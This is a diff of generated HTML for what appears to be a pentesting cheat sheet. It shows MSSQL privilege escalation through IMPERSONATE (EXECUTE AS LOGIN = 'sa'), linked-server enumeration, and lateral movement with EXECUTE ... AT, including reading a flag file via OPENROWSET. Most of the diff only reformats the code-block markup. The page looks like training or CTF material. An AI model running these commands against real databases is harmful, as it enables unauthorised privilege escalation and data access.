 <p>SQL Server has a special permission, named <code>IMPERSONATE</code>, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends:</p>
 <p>Impersonating sysadmin:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a># Identify Users that we Can Impersonate
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#39;IMPERSONATE&#39; 
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>go
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
-</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a># Verify if our current user has the sysadmin role:
-</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>SELECT SYSTEM_USER
-</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
-</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>go
-</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>#  value 0 indicates no sysadmin role, value 1 is sysadmin role
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span>
+<span class="normal"><a href="#__codelineno-17-3">3</a></span>
+<span class="normal"><a href="#__codelineno-17-4">4</a></span>
+<span class="normal"><a href="#__codelineno-17-5">5</a></span>
+<span class="normal"><a href="#__codelineno-17-6">6</a></span>
+<span class="normal"><a href="#__codelineno-17-7">7</a></span>
+<span class="normal"><a href="#__codelineno-17-8">8</a></span>
+<span class="normal"><a href="#__codelineno-17-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a># Identify Users that we Can Impersonate
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#39;IMPERSONATE&#39; 
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a>go
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5"></a># Verify if our current user has the sysadmin role:
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6"></a>SELECT SYSTEM_USER
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7"></a>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8"></a>go
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9"></a>#  value 0 indicates no sysadmin role, value 1 is sysadmin role
+</span></code></pre></div></td></tr></table></div>
 <p>Impersonating sa user:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>USE master
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>EXECUTE AS LOGIN = &#39;sa&#39;
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>SELECT SYSTEM_USER
-</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
-</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>go
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span>
+<span class="normal"><a href="#__codelineno-18-2">2</a></span>
+<span class="normal"><a href="#__codelineno-18-3">3</a></span>
+<span class="normal"><a href="#__codelineno-18-4">4</a></span>
+<span class="normal"><a href="#__codelineno-18-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>USE master
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a>EXECUTE AS LOGIN = &#39;sa&#39;
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3"></a>SELECT SYSTEM_USER
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4"></a>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5"></a>go
+</span></code></pre></div></td></tr></table></div>
 <blockquote>
 <p>It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database.</p>
 </blockquote>
 <p>To revert the operation and return to our previous user</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>REVERT
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>go
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>REVERT
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a>go
+</span></code></pre></div></td></tr></table></div>
 <h3 id="communicate-with-other-databases-with-mssql">Communicate with Other Databases with MSSQL</h3>
 <p><code>MSSQL</code> has a configuration option called <a href="https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine">linked servers</a>. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.</p>
 <p>If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a># Identify linked Servers in MSSQL
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>SELECT srvname, isremote FROM sysservers
-</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>go
-</span></code></pre></div>
-<div class="language-output highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="go">srvname                             isremote</span>
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="go">----------------------------------- --------</span>
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="go">DESKTOP-MFERMN4\SQLEXPRESS          1</span>
-</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="go">10.0.0.12\SQLEXPRESS                0</span>
-</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>
-</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>
-</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="go"># isremote, where 1 means is a remote server, and 0 is a linked server. </span>
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>#  Identify the user used for the connection and its privileges:
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>EXECUTE(&#39;select @@servername, @@version, system_user, is_srvrolemember(&#39;&#39;sysadmin&#39;&#39;)&#39;) AT [10.0.0.12\SQLEXPRESS]
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>go 
-</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
-</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a># The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).
-</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>
-</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>
-</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>
-</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>execute (&#39;select * from OPENROWSET(BULK &#39;&#39;C:/Users/Administrator/desktop/flag.txt&#39;&#39;, SINGLE_CLOB) AS Contents&#39;) at [local.test.linked.srv];  
-</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a>go
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span>
+<span class="normal"><a href="#__codelineno-20-2">2</a></span>
+<span class="normal"><a href="#__codelineno-20-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a># Identify linked Servers in MSSQL
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2"></a>SELECT srvname, isremote FROM sysservers
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3"></a>go
+</span></code></pre></div></td></tr></table></div>
+<div class="language-output highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span>
+<span class="normal"><a href="#__codelineno-21-2">2</a></span>
+<span class="normal"><a href="#__codelineno-21-3">3</a></span>
+<span class="normal"><a href="#__codelineno-21-4">4</a></span>
+<span class="normal"><a href="#__codelineno-21-5">5</a></span>
+<span class="normal"><a href="#__codelineno-21-6">6</a></span>
+<span class="normal"><a href="#__codelineno-21-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="go">srvname                             isremote</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2"></a><span class="go">----------------------------------- --------</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3"></a><span class="go">DESKTOP-MFERMN4\SQLEXPRESS          1</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4"></a><span class="go">10.0.0.12\SQLEXPRESS                0</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5"></a>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6"></a>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7"></a><span class="go"># isremote, where 1 means is a remote server, and 0 is a linked server. </span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-22-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-22-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-22-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-22-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-22-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-22-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-22-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-22-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-22-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a>#  Identify the user used for the connection and its privileges:
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2"></a>EXECUTE(&#39;select @@servername, @@version, system_user, is_srvrolemember(&#39;&#39;sysadmin&#39;&#39;)&#39;) AT [10.0.0.12\SQLEXPRESS]
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3"></a>go 
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4"></a>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5"></a># The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6"></a>
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7"></a>
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8"></a>
+</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9"></a>execute (&#39;select * from OPENROWSET(BULK &#39;&#39;C:/Users/Administrator/desktop/flag.txt&#39;&#39;, SINGLE_CLOB) AS Contents&#39;) at [local.test.linked.srv];  
+</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10"></a>go
+</span></code></pre></div></td></tr></table></div>
 <p>As <code>sysadmin</code>, we control the SQL Server instance. We can read data from any database or execute system commands with <code>xp_cmdshell</code>.</p>
 <blockquote>
 <p>If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).</p>
@@ -17785,7 +17961,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
